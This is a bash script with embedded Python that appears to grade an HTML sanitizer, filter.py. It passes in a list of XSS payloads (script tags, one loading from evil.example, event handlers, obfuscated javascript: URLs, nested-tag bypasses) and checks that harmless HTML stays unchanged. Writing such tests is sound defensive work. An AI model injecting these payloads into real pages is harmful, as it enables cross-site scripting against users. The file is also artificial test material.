#!/bin/bash
set -e
[ -f filter.py ] || { echo "no filter.py"; exit 1; }
python3 - <<'PY'
import html, os, re, subprocess, sys, tempfile
def run(doc):
    d = tempfile.mkdtemp()
    i, o = os.path.join(d, "in.html"), os.path.join(d, "out.html")
    open(i, "w", encoding="utf-8").write(doc)
    subprocess.run([sys.executable, "filter.py", i, o], check=True, timeout=20, capture_output=True)
    return open(o, encoding="utf-8").read()

attacks = [
 '<p>hi</p><script>alert(1)</script>',
 '<SCRIPT SRC="https://evil.example/x.js"></SCRIPT>',
 '<img src=x onerror=alert(1)>',
 '<a href="javascript:alert(1)">x</a>',
 '<a href=" JaVaScRiPt:alert(1)">x</a>',
 '<a href="jav&#x61;script:alert(1)">x</a>',
 '<a href="java\tscript:alert(1)">x</a>',
 '<body onload=alert(1)><p>b</p></body>',
 '<div onclick=\'steal()\'>d</div>',
 '<svg><script>alert(1)</script></svg>',
 '<input onfocus=alert(1) autofocus>',
 '<scr<script>ipt>alert(1)</scr</script>ipt>',
 '<iframe src="javascript:alert(1)"></iframe>',
 '<p onmouseover = "x()" class="a">t</p>',
]
bad = []
for a in attacks:
    out = run(a)
    flat = html.unescape(re.sub(r"[\x00-\x20]+", "", out)).lower()
    if "<script" in flat or "javascript:" in flat or re.search(r"<[^>]*\son\w+\s*=", html.unescape(out), re.I) or re.search(r"<[^>]*\bon\w+=", flat, re.I):
        bad.append(a)
if bad:
    print("still dangerous:", bad[:3]); sys.exit(1)

benign = [
 '<!doctype html>\n<html><head><title>T</title></head>\n<body>\n<h1 class="big">Hello</h1>\n<p>Click <a href="https://example.com/a?b=1&amp;c=2">here</a>.</p>\n</body></html>\n',
 '<p>The word onclick and the word script and javascript are fine in text.</p>',
 '<img src="photo.png" alt="onerror is just a word" width="10">',
 '<a href="/docs/javascript-guide.html">guide</a><button type="submit" class="on-off">Go</button>',
 '<style>p { color: red; }</style><p style="margin:0">x</p>\n\n\n<pre>  spaced   text\n</pre>',
 '<div data-on="x" id="contact">Ünïcödé ✓</div>',
]
changed = [b[:50] for b in benign if run(b) != b]
if changed:
    print("harmless input was altered:", changed[0]); sys.exit(1)
PY
